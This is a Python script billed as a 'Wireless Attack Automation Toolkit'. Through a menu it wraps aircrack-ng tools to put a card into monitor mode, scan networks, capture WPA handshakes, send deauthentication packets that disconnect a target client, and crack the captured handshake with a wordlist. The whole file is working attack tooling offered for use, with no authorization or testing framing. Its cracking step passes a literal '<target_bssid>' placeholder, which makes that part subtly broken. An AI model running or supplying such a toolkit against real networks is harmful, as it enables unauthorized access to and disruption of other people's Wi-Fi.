#!/usr/bin/env python3

import subprocess
import time
import os
import signal

# Helper to run system commands with output
def run_cmd(cmd, shell=False):
    try:
        return subprocess.run(cmd, shell=shell, check=True)
    except subprocess.CalledProcessError as e:
        print(f"[!] Command failed: {e}")

# Enable monitor mode on a wireless interface
def enable_monitor_mode(interface):
    print("[*] Enabling monitor mode...")
    run_cmd(["sudo", "ip", "link", "set", interface, "down"])
    run_cmd(["sudo", "iw", interface, "set", "monitor", "control"])
    run_cmd(["sudo", "ip", "link", "set", interface, "up"])
    print("[+] Monitor mode enabled.")

# Scan for nearby wireless networks
def scan_networks(interface):
    print("[*] Scanning networks. Stop with Ctrl+C when ready...")
    try:
        run_cmd(["sudo", "airodump-ng", interface])
    except KeyboardInterrupt:
        print("\n[+] Scan stopped.")

# Capture WPA/WPA2 handshake
def capture_handshake(interface, bssid, channel, output_prefix):
    print("[*] Starting handshake capture...")
    run_cmd(["sudo", "airodump-ng", "-c", channel, "--bssid", bssid, "-w", output_prefix, interface])

# Send deauthentication packets to force handshake
def deauth_attack(interface, target_bssid, client_mac):
    print("[*] Sending deauth packets...")
    run_cmd(["sudo", "aireplay-ng", "--deauth", "10", "-a", target_bssid, "-c", client_mac, interface])

# Crack handshake with a wordlist
def crack_handshake(capture_file, wordlist_path):
    print("[*] Cracking handshake...")
    run_cmd(["sudo", "aircrack-ng", "-w", wordlist_path, "-b", "<target_bssid>", capture_file])

# Main CLI menu
def main():
    print("=== Wireless Attack Automation Toolkit ===")
    interface = input("Enter wireless interface (e.g. wlan0): ")

    while True:
        print("\nMenu:")
        print("1. Enable Monitor Mode")
        print("2. Scan Wireless Networks")
        print("3. Capture WPA Handshake")
        print("4. Deauth Attack")
        print("5. Crack Handshake")
        print("0. Exit")
        choice = input("Choice: ")

        if choice == "1":
            enable_monitor_mode(interface)
        elif choice == "2":
            scan_networks(interface)
        elif choice == "3":
            bssid = input("Enter target BSSID: ")
            channel = input("Enter channel: ")
            output_prefix = input("Enter output file prefix: ")
            capture_handshake(interface, bssid, channel, output_prefix)
        elif choice == "4":
            bssid = input("Enter target BSSID: ")
            client = input("Enter client MAC address: ")
            deauth_attack(interface, bssid, client)
        elif choice == "5":
            capture_file = input("Enter .cap file path: ")
            wordlist = input("Enter path to wordlist: ")
            crack_handshake(capture_file, wordlist)
        elif choice == "0":
            print("[*] Exiting...")
            break
        else:
            print("Invalid option.")

if __name__ == "__main__":
    main()
